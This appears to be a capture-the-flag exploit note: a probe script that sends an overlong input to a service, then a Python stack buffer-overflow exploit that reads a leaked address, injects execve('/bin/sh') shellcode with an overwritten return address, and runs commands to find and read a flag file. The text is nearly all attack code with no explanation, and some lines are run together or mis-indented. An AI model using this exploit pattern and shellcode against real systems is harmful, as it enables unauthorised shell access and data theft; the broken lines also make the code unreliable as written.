
check connection


```python

import socket

s=socket.create_connection("ip",port)
s.recv(2048)
s.send(b'B'*400+b'\n')
print(s.recv(1024))
```



```python

#!/usr/bin/env python3

import socket, time, re, struct


s = socket.create_connection(('172.25.65.165', 1337), 10)

time.sleep(0.6)
banner = s.recv(2048).decode(errors='replace')
print(banner)addr = int(re.search(r'location to you: (0x[0-9a-f]+)', banner).group(1), 16)

shellcode = ( b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e' b'\x89\xe3\x50\x53\x89\xe1\x50\xb0\x0b\xcd\x80')
payload = shellcode + b'A' * (112 - len(shellcode)) + struct.pack('<I', addr) + b'\n'
s.send(payload)time.sleep(1)

s.send( b'id;\n' b'find / -maxdepth 4 -name "flag*" -type f 2>/dev/null | grep -v "^/proc" | head -5; ' b'cat $(find / -maxdepth 4 -name "flag.txt" -type f 2>/dev/null | head -1)\n')

s.settimeout(3)

try: 
	out = b'' 

	while True: 
		d = s.recv(4096)
		 if not d: 
			 break
		out += d
except socket.timeout: pass

print(out.decode(errors='replace'))
s.close()

```